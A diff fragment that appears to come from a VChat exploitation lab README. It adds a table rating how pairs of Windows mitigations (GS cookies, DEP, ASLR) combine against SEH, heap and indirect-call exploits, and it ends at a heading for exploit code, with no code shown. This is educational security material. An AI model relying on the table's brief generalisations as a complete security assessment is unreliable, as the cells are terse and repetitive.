+|Defense: Buffer Security Check (GS)|X|**Increased Security**: Combining two effective mitigations provides the benefits of both.|**Increased Security**: ASLR increases the randomness of the generated security cookie. Additionally this makes it harder for attackers to reuse external functions loaded by the program.|**Increased Security**: Combining two effective mitigations provides the benefits of both.|**Increased Security**: Combining two effective mitigations provides the benefits of both.|**No Increase**: The Windows Heap is not exploited.|**No Increase**: Indirect Calls/Jumps are not exploited. | | |
+|Defense: Data Execution Prevention (DEP)|**Increased Security**: Combining two effective mitigations provides the benefits of both.|X| **Increased Security**: Combining two effective mitigations provides the benefits of both.|**No Increase**: The SEH feature is not exploited.|**No Increase**: The SEH feature is not exploited.|**No Increase**: The windows Heap is not exploited.|**No Increase**: Indirect Calls/Jumps are not exploited. | |
+|Defense: Address Space Layout Randomization (ASLR)|**Increased Security**: ASLR increases the randomness of the generated security cookie. Additionally this makes it harder for attackers to reuse external functions loaded by the program..|**Increased Security**: Combining two effective mitigations provides the benefits of both.|X|**No Increase**: The SEH feature is not exploited.|**No Increase**: The SEH feature is not exploited.|**No Increase**: The Windows Heap is not exploited.|**No Increase**: Indirect Calls/Jumps are not exploited. | 
+
+> [!NOTE] 
+> We omit repetitive rows that represent the non-effective mitigation strategies as their cases are already covered.
 ## VChat and Exploit Code
 
 ### VChat Code
